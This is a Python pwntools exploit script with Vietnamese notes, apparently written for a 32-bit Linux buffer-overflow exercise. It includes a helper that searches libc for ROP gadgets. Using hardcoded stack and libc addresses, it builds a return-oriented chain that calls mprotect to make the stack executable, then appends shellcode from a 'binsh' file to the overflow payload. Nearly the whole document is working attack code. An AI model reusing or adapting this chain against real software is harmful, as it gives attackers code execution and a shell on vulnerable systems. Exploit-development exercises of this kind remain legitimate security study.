#!/usr/bin/python
# coding: utf-8

import sys
from pwn import *

class MyELF(ELF):
	def __init__(self, aModule):
		ELF.__init__(self, aModule)

	def searchAsm(self, needle, textAsm = True):
		"""searchAsm(needle, writable = False) -> str generator
		Search the ELF's virtual address space for the specified string.
		Arguments:
			needle(str): String to searchAsm for.
			segments(segment): specify segments
		Returns:
			An iterator for each virtual address that matches.
		Examples:
			>>> bash = ELF(which('bash'))
			>>> bash.address + 1 == next(bash.searchAsm('ELF'))
			True
			>>> sh = ELF(which('bash'))
			>>> # /bin/sh should only depend on libc
			>>> libc_path = [key for key in sh.libs.keys() if 'libc' in key][0]
			>>> libc = ELF(libc_path)
			>>> # this string should be in there because of system(3)
			>>> len(list(libc.searchAsm('/bin/sh'))) > 0
			True
		"""
		if textAsm == True:
			needle = asm(needle)
		segments = self.executable_segments
		load_address_fixup = (self.address - self.load_addr)

		for seg in segments:
			addr   = seg.header.p_vaddr
			data   = seg.data()
			offset = 0
			while True:
				offset = data.find(needle, offset)
				if offset == -1:
					break
				yield (addr + offset + load_address_fixup)
				offset += 1

'''
khi dùng rop của pwntools, cần đến capstone
cài lại capstone:
pip uninstall capstone
pip install capstone

nhận thấy các rop của pwntools chỉ quan tâm tới các regs và số mov

sử dụng ropper khá hay, khi có thể lọc các badbytes, và searchAsm được nhanh chóng
sử dụng kết hợp gdb để có thể lấy được các gadgets một cách tổng quát

sử dụng pwntools ROP searchAsm để tìm kiếm các gadget pop một số thanh ghi nhất định, vd:
searchAsm(regs=['edi', 'ebx'])

lấy danh sách tham số của một hàm: lấy số tham số trong func_code.co_argcount rồi lấy các biến đầu tiên trong __code__.co_varnames

mẹo nhảy: sử dụng ret 0x4, 0x8,... tới một hàm, ta có thể đặt các tham số xa vị trí ret.

ropper không cache, nhưng pwntools có cache, nên
có thể searchAsm gadget bằng ropper nhưng load lên bằng pwntools

tại sao 81 f0 và 35 đều là mã lệnh xor eax, 0x..., khiến cho việc asm của pwntools không ra được mã lệnh
ta cần?
do đó ta phải đọc byte code trong gdb

nhận thấy segment PT_PHDR nằm trong PT_LOAD
tuy peda xác định legent là rodata, không phải code nhưng mà xem vm vẫn x được

điều khiện khai thác là phải leak được stack base và libcBase
'''
retOff = 0x5c - 0x44
bufAddr = 0xbffff364
retAddr = bufAddr + retOff

libc = MyELF('/lib/i386-linux-gnu/libc.so.6')

stackBase = 0xbffdf000
xorEax = 0x18c483ff
foo = 0x90909090
prot = 0x7
libcBase = 0xb7e1e000

context.arch='i386'
rPopEaxRet 			= libcBase + libc.searchAsm('pop eax; ret').next()
rXorEaxPopEbxRet 	= libcBase + libc.searchAsm('\x81\xf0'+p32(xorEax)+asm('pop ebx; ret'), textAsm=False).next()
rXchgEaxEcxRet 		= libcBase + libc.searchAsm('xchg eax, ecx; add al, 0xa; ret;').next()
rXchgEaxEdxRet 		= libcBase + libc.searchAsm('xchg eax, edx; ret;').next()
rPopEdiRet 	= libcBase + libc.searchAsm('pop edi; ret').next()
rPushalRet 			= libcBase + libc.searchAsm('pushad; ret').next()
rRet8 				= libcBase + libc.searchAsm('ret 8').next()
rIncEcxRet 			= libcBase + libc.searchAsm('inc ecx; ret').next()
rPopEcxPopEaxRet 	= libcBase + libc.searchAsm('pop ecx; pop eax; ret').next() 
rPopEsiRet		 	= libcBase + libc.searchAsm('pop esi; ret').next()
rPivot16			= libcBase + libc.searchAsm('pop edx; pop ecx; pop eax; ret;').next()
rCallEsp			= libcBase + libc.searchAsm('call esp').next()

mprotectAddr = libcBase + libc.symbols['mprotect']

rop = [
	rPopEaxRet,
	stackBase ^ xorEax, # raw --> eax
	rXorEaxPopEbxRet, # eax = stackBase
	foo,
	rXchgEaxEdxRet, # edx = stackBase
	rPopEcxPopEaxRet,
	0xFFFFFFFF, # ecx = -1
	prot ^ xorEax, # raw --> eax
	rIncEcxRet, # ecx = 0
	rIncEcxRet, # ecx = 1
	rXorEaxPopEbxRet, # eax = prot
	rPivot16, # ebx = ret 16;
	rPopEdiRet,
	rRet8, # edi = ret 4;
	rPopEsiRet,
	mprotectAddr,
	rPushalRet,
	rCallEsp
	]

payloadLen = 0x108

payload = ''
payload += 'A'*retOff
payload += ''.join(p32(_) for _ in rop)
payload += open('./binsh', 'rb').read()
payload += 'A'*(payloadLen-len(payload))

sys.stdout.write(payload)
sys.stdout.flush

#pushad/pushal:
#edi: ret 4;
#esi
#ebp: mprotect
#esp
#ebx: someAddr
#edx: stackbase
#ecx: 1
#eax: 7
